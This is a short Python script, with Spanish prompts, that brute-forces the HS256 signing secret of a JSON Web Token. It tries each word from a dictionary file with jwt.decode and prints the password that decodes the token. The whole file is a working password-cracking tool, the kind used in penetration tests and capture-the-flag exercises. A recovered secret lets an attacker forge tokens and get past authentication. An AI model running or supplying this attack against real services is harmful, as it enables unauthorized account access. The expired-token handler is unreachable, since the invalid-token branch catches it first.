import jwt;

print("Script to brute-force JWT secret token",'white')
encoded = input("JWT TOKEN: ")
passwords = input("Diccionario: ")


with open(passwords) as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
            print('Token decodificado con la siguiente password ....[' + secret.rstrip() + ']')
            break
        except jwt.InvalidTokenError:
            print('Token Invalido .... [' + secret.rstrip() + ']')
        except jwt.ExpiredSignatureError:
            print('Token Expirado ....[' + secret.rstrip() + ']')
